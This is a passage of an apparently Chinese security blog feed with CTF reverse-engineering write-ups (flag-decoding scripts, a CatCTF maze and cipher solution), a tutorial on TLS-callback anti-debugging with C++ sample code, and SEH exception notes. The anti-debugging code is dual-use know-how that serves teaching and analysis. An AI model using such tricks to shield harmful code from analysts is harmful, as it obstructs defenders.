class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x36</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x37</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2B</span>, <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x37</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x36</span>, <span class="number">0x81</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x02</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x33</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x02</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x38</span>, <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>,</span><br><span class="line">    <span class="number">0xFA</span>, <span class="number">0x81</span>, <span class="number">0x02</span>, <span class="number">0x80</span>, <span class="number">0x05</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x3D</span>,</span><br><span class="line">    <span class="number">0x81</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x2F</span>, <span class="number">0x81</span>, <span class="number">0x13</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0x05</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">pos = <span class="built_in">len</span>(flag)</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(op) - <span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> op[i] == <span class="number">0x80</span> <span class="keyword">and</span> op[i + <span class="number">1</span>] == <span class="number">0x05</span>:</span><br><span class="line">        pos -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op[i] == <span class="number">0x80</span> <span class="keyword">and</span> op[i + <span class="number">1</span>] == <span class="number">0x14</span>:</span><br><span class="line">        tmp = op[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> op[i + <span class="number">3</span>] == <span class="number">0x81</span> <span class="keyword">and</span> op[i + <span class="number">4</span>] == <span class="number">0x13</span>:</span><br><span class="line">            flag[pos] ^= tmp</span><br><span class="line">        <span class="keyword">elif</span> op[i + <span class="number">3</span>] == <span class="number">0x81</span> <span class="keyword">and</span> op[i + <span class="number">4</span>] == <span class="number">0x11</span>:</span><br><span class="line">            flag[pos] -= tmp</span><br><span class="line">        <span class="keyword">elif</span> op[i + <span class="number">3</span>] == <span class="number">0x80</span> <span class="keyword">and</span> op[i + <span class="number">4</span>] == <span class="number">0x12</span>:</span><br><span class="line">            flag[pos] += tmp</span><br><span class="line">        <span class="keyword">elif</span> op[i + <span class="number">3</span>] == <span class="number">0x81</span> <span class="keyword">and</span> op[i + <span class="number">4</span>] == <span class="number">0x02</span>:</span><br><span class="line">            flag[pos] = tmp - flag[pos]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>vivo50_to_mk_Amerc1a_Gr3at_again</p><p>UNCTF{B1den_will_make_Ch1na_gr3at!}</p>        <h1 id="shelled-babyxor"   >          <a href="#shelled-babyxor" class="heading-link"><i class="fas fa-link"></i></a><a href="#shelled-babyxor" class="headerlink" title="shelled_babyxor"></a>shelled_babyxor</h1>      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x5D</span>, <span class="number">0x5F</span>, <span class="number">0x49</span>,</span><br><span class="line">    <span class="number">0X53</span>, <span class="number">0x79</span>, <span class="number">0x4C</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x56</span>, <span class="number">0x47</span>, <span class="number">0x45</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x42</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x79</span>, <span class="number">0x40</span>, <span class="number">0x4F</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x41</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x47</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>( (i^<span class="number">0x26</span>) &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CatCTFwp</title>
      <link href="/2023/03/06/CatCTFwp/"/>
      <url>/2023/03/06/CatCTFwp/</url>
      
        <content type="html"><![CDATA[        <h1 id="NepnepxCATCTF-部分题解"   >          <a href="#NepnepxCATCTF-部分题解" class="heading-link"><i class="fas fa-link"></i></a><a href="#NepnepxCATCTF-部分题解" class="headerlink" title="NepnepxCATCTF 部分题解"></a>NepnepxCATCTF 部分题解</h1>      <p>by 没有眼的鱼</p>        <h2 id="Reverse"   >          <a href="#Reverse" class="heading-link"><i class="fas fa-link"></i></a><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2>              <h2 id="The-cat-did-it"   >          <a href="#The-cat-did-it" class="heading-link"><i class="fas fa-link"></i></a><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h2>      <p>脑筋急转弯</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062112541.png" alt="image-20230101210628524"></p><p>问概率，首先排除直接算。选择看图像。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301012107438.png" alt="image-20230101210749364"></p><p>缩小，发现一直在猫的内部，所以逃出去的概率是0%</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CatCTF&#123;md5(0%)&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="StupidOrangeCat2"   >          <a href="#StupidOrangeCat2" class="heading-link"><i class="fas fa-link"></i></a><a href="#StupidOrangeCat2" class="headerlink" title="StupidOrangeCat2"></a>StupidOrangeCat2</h3>      <p>32位程序。打开文件，发现是个迷宫游戏</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301012049771.png" alt="image-20230101204938711"></p><p>似乎直接走就行了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062112209.png" alt="image-20230101205026641"></p><p>猜测是摩斯电码</p><p>喵是<code>-</code>，呜是<code>.</code>，对照码表翻译过来就是</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CAT_IN_X_19_Y_39</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062112211.png" alt="image-20230101205216579"></p><p>走到了之后提示要找key，IDA接管调试</p><p>尝试输入</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301012053554.png" alt="image-20230101205359528"></p><p>发现进到这个函数里面</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062112762.png" alt="image-20230101210042985"></p><p>v6里面存的就是你的输入，v4是输出，v8是key</p><p>最后v4会和v5做比较</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062112232.png" alt="image-20230101210240285"></p><p>就一个加密，直接写脚本</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> key[] = &#123;</span><br><span class="line">    <span class="number">0x155E79F0</span>, <span class="number">0xF93946E8</span>, <span class="number">0x010E2D06</span>, <span class="number">0xC3BDE00F</span>, <span class="number">0x2918C682</span>, <span class="number">0xFBEA4880</span>, <span class="number">0xC521250E</span>, <span class="number">0x581CA38F</span>, </span><br><span class="line">    <span class="number">0xDDD24F01</span>, <span class="number">0xFE861597</span>, <span class="number">0x4ED29058</span>, <span class="number">0xFC407DE8</span>, <span class="number">0x58AAAFE1</span>, <span class="number">0x7FD7D1CB</span>, <span class="number">0x26344632</span>, <span class="number">0x1BC00784</span>, </span><br><span class="line">    <span class="number">0x554DECDB</span>, <span class="number">0x43688970</span>, <span class="number">0x552A77BA</span>, <span class="number">0xB1A0477B</span>, <span class="number">0xE4AED7C8</span>, <span class="number">0xE8731836</span>, <span class="number">0x035B1B59</span>, <span class="number">0x8F0577FF</span>, </span><br><span class="line">    <span class="number">0x300327A4</span>, <span class="number">0x11A38C30</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCCCC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flag[] = &#123;</span><br><span class="line">        <span class="number">0x936AB12C</span>, <span class="number">0xED8330B5</span>, <span class="number">0xEE5C5E88</span>, <span class="number">0xE10B508C</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j+=<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x1 = flag[j];</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> x2 = flag[j+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">12</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> t1 = (x1 &amp; (<span class="number">0x1F</span>));</span><br><span class="line">            x2 = x2 - key[<span class="number">2</span>*i+<span class="number">1</span>];</span><br><span class="line">            x2 = (x2 &lt;&lt; (<span class="number">0x20</span>-t1)) | (x2 &gt;&gt; t1);</span><br><span class="line">            x2 = x2 ^ x1;</span><br><span class="line"></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> t2 = (x2 &amp; (<span class="number">0x1F</span>));</span><br><span class="line">            x1 = x1 - key[<span class="number">2</span>*i];</span><br><span class="line">            x1 = (x1 &lt;&lt; (<span class="number">0x20</span>-t2)) | (x1 &gt;&gt; t2);</span><br><span class="line">            x1 = x1 ^ x2;</span><br><span class="line">        &#125;</span><br><span class="line">        x1 -= key[<span class="number">0</span>];</span><br><span class="line">        x2 -= key[<span class="number">1</span>];</span><br><span class="line">        string enc = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = x2 &amp; <span class="number">0xff</span>;</span><br><span class="line">            enc = c + enc;</span><br><span class="line">            x2 = x2 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="type">char</span> c = x1 &amp; <span class="number">0xff</span>;</span><br><span class="line">            enc = c + enc;</span><br><span class="line">            x1 = x1 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; enc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIKE_OR_LOVE_CAT</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301012104239.png" alt="image-20230101210416211"></p><p>答案正确，走出去就行了</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301012105295.png" alt="image-20230101210514264"></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CatCTF&#123;CAT_IN_X_19_Y_39_LIKE_OR_LOVE_CAT&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TLS反调试</title>
      <link href="/2023/03/06/TLS%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>/2023/03/06/TLS%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[        <h1 id="TLS反调试"   >          <a href="#TLS反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS反调试" class="headerlink" title="TLS反调试"></a>TLS反调试</h1>      <p>TLS(Thread Local Storage,线程局部储存)，主要用于给线程独立的传值。由于线程不拥有进程的资源，所以几个同一进程的几个线程需要独立赋值时的需要通过TLS技术。每个线程创建时都会分配一个index。所以，这个索引index是全局变量，线程根据index来获取其他线程传过来的返回值。</p>        <h2 id="TLS为什么能被用于反调试"   >          <a href="#TLS为什么能被用于反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS为什么能被用于反调试" class="headerlink" title="TLS为什么能被用于反调试"></a>TLS为什么能被用于反调试</h2>      <p>AddressOfCallBacks 是线程建立和退出时的回调函数。包括主线程和其他线程。而且，因为程序运行时TLS数据初始化和TLS回调函数都在AddressOfEntryPoint之前，因此若将反调试代码插入到TLS回调函数，则可以在程序执行之前进行操作</p>        <h2 id="TLS反调试示例"   >          <a href="#TLS反调试示例" class="heading-link"><i class="fas fa-link"></i></a><a href="#TLS反调试示例" class="headerlink" title="TLS反调试示例"></a>TLS反调试示例</h2>              <h3 id="静态TLS反调试"   >          <a href="#静态TLS反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#静态TLS反调试" class="headerlink" title="静态TLS反调试"></a>静态TLS反调试</h3>      <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK_2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK_1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACK[] = &#123;TLS_CALLBACK_1, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line">DWORD isBeingDebug = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK_1</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">IsDebuggerPresent</span>())&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;我什么都逆不出来&quot;</span>, <span class="string">&quot;TLS_CALLBACK&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;拜托了另一个我&quot;</span>, <span class="string">&quot;TLS_CALLBACK&quot;</span>, MB_OK);</span><br><span class="line"><span class="built_in">VirtualProtect</span>(&amp;pTLS_CALLBACK[<span class="number">1</span>], <span class="built_in">sizeof</span>(PIMAGE_TLS_CALLBACK), PAGE_EXECUTE_READWRITE, &amp;isBeingDebug);</span><br><span class="line">pTLS_CALLBACK[<span class="number">1</span>] = &#123;TLS_CALLBACK_2&#125;;</span><br><span class="line"><span class="built_in">VirtualProtect</span>(&amp;pTLS_CALLBACK[<span class="number">1</span>], <span class="built_in">sizeof</span>(PIMAGE_TLS_CALLBACK), isBeingDebug, &amp;isBeingDebug);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK_2</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span> </span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;是是是&quot;</span>, <span class="string">&quot;TLS_CALLBACK&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;main&quot;</span>, <span class="string">&quot;main&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="应对"   >          <a href="#应对" class="heading-link"><i class="fas fa-link"></i></a><a href="#应对" class="headerlink" title="应对"></a>应对</h2>      <p>在可执行文件中，TLS储存在数据目录表中。可以通过CFFF等PE工具来提前发现。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202303062105242.png" alt="image-20230306210515171"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SEH-结构化异常处理</title>
      <link href="/2023/01/15/SEH-%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>/2023/01/15/SEH-%E7%BB%93%E6%9E%84%E5%8C%96%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[        <h1 id="SEH-结构化异常处理"   >          <a href="#SEH-结构化异常处理" class="heading-link"><i class="fas fa-link"></i></a><a href="#SEH-结构化异常处理" class="headerlink" title="SEH-结构化异常处理"></a>SEH-结构化异常处理</h1>      <p>本文为《逆向工程核心原理》读书笔记，采用的程序示例均来源于此书</p>        <h2 id="什么是异常"   >          <a href="#什么是异常" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是异常" class="headerlink" title="什么是异常"></a>什么是异常</h2>      <p>要学习异常处理，首先要了解什么异常</p><p>常见的异常如下：</p>        <h3 id="EXCEPTION-ACCESS-VIOLATION-C0000005"   >          <a href="#EXCEPTION-ACCESS-VIOLATION-C0000005" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXCEPTION-ACCESS-VIOLATION-C0000005" class="headerlink" title="EXCEPTION_ACCESS_VIOLATION(C0000005)"></a>EXCEPTION_ACCESS_VIOLATION(C0000005)</h3>      <p>访问内存异常，例如访问不存在的或者是不具权限的内存区域</p><p>例如，这里将0x1移入0x0的地址，在x64dbg中可以看到不同段的权限信息</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">mov dword ptr ds:[eax], 0x1</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152143664.png" alt="image-20230115214338599"></p><p>可以看出，0x0是非法地址，于是就会触发异常。</p><p>不仅是访问，修改无“write”权限的地址，或者内核区域，都会引发异常</p>        <h3 id="EXCEPTION-BREAKPOINT-80000003"   >          <a href="#EXCEPTION-BREAKPOINT-80000003" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXCEPTION-BREAKPOINT-80000003" class="headerlink" title="EXCEPTION_BREAKPOINT(80000003)"></a>EXCEPTION_BREAKPOINT(80000003)</h3>      <p>断点异常</p><p>调试器利用断点异常来实现断点功能</p><p>INT3断点对应的16进制为0xCC（IA-32）</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152154381.png" alt="image-20230115215403355"></p><p>在0x401000处dump内存，再用010打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152154531.png" alt="image-20230115215442507"></p><p>很明显发现5A10400前面的68变成了CC，即这里已经被下了断点</p>        <h3 id="EXCEPTION-ILLEGAL-INSTRUCTION-C000001D"   >          <a href="#EXCEPTION-ILLEGAL-INSTRUCTION-C000001D" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXCEPTION-ILLEGAL-INSTRUCTION-C000001D" class="headerlink" title="EXCEPTION_ILLEGAL_INSTRUCTION(C000001D)"></a>EXCEPTION_ILLEGAL_INSTRUCTION(C000001D)</h3>      <p>顾名思义，非法指令，当调试器遇到无法解析的指令的时候就会触发该异常</p>        <h3 id="EXCEPTION-INT-DIVIDE-BY-ZERO-C0000094"   >          <a href="#EXCEPTION-INT-DIVIDE-BY-ZERO-C0000094" class="heading-link"><i class="fas fa-link"></i></a><a href="#EXCEPTION-INT-DIVIDE-BY-ZERO-C0000094" class="headerlink" title="EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094)"></a>EXCEPTION_INT_DIVIDE_BY_ZERO(C0000094)</h3>      <p>除零异常</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax</span><br><span class="line">div eax</span><br></pre></td></tr></table></div></figure><p>除法的分母为零的时候，触发异常</p>        <h2 id="SEH异常处理工作原理"   >          <a href="#SEH异常处理工作原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#SEH异常处理工作原理" class="headerlink" title="SEH异常处理工作原理"></a>SEH异常处理工作原理</h2>      <p>SEH 是针对于异常的一种处理机制，这个异常分为硬件异常和软件异常，这里所说的硬件异常是狭义的异常，也就是 CPU 产生的异常。比如除零操作，CPU 执行除零操作时候，会自主启动异常处理机制。软件异常，就是程序模拟的异常，比如调用 RaiseException 函数。软件异常是可以随意触发的，windows 系统内部遇到问题会触发。</p><p>要让SEH处理异常，首先得注册异常。SEH是线程相关的，也就是说，每个线程都有他自己的异常处理注册表。异常处理注册表在内存中以结构体链表的形式储存</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></div></figure><p>结构体指针Next则指向下一个结点。当触发异常的时候，遍历该链表以找到对应的Hander来处理，否则则直接结束程序。</p><p>若Next &#x3D;&#x3D; 0xFFFFFFFF，则说明异常处理注册表结束。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301152212291.png" alt="image-20230115221235264"></p><p>Handler指向异常处理函数</p><p>该函数接收到异常后会返回EXCEPTION_DISPOSITION这个枚举类型，每个枚举类型将会指示异常处理的下一步进程</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span 